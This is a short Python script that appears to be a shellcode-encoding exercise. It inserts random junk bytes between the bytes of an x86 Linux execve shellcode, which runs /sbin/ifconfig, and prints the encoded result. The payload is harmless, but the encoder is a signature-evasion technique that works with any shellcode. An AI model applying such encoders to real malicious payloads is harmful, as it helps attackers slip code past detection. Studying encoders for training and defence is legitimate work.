import random

def formatBytesA(byts):
    bytStr = ""
    for byt in byts:
        bytStr += r"\x" + hex(byt)[2:].zfill(2)
    return bytStr

def formatBytesB(byts):
    bytStr = ""
    for byt in byts:
        bytStr += '0x%02x, '% byt
    return bytStr

def encodeShellcode(sc):
    eShellcodeA = ""
    eShellcodeB = ""
    scLen = 0
    randTyp = 0

    for i in range(len(sc)):
        byt = sc[i]
        bytStr = formatBytesA([byt])

        if i == 0:
            eShellcodeA += bytStr
            eShellcodeB += '0x%02x, '% byt
            scLen += 1
            continue

        randByts = [random.randrange(1, 0xff + 1)] if randTyp == 0 else [random.randrange(1, 0xff + 1), random.randrange(1, 0xff + 1)]
        randTyp = 0 if sum(randByts) % 2 != 0 else 1

        
        eShellcodeA += formatBytesA(randByts) + bytStr
        eShellcodeB += formatBytesB(randByts) + ('0x%02x, '% byt)


        scLen += len(randByts) + 1
    print("\nEncoded Shellcode: %s" % eShellcodeA)
    print("\nDefined Bytes: %s" % eShellcodeB)
    print("\nLength: 0x%02x" % scLen)

shellcode = "\x31\xc0\x50\x68\x6e\x66\x69\x67\x68\x69\x66\x63\x6f\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

encodeShellcode(bytearray(shellcode))
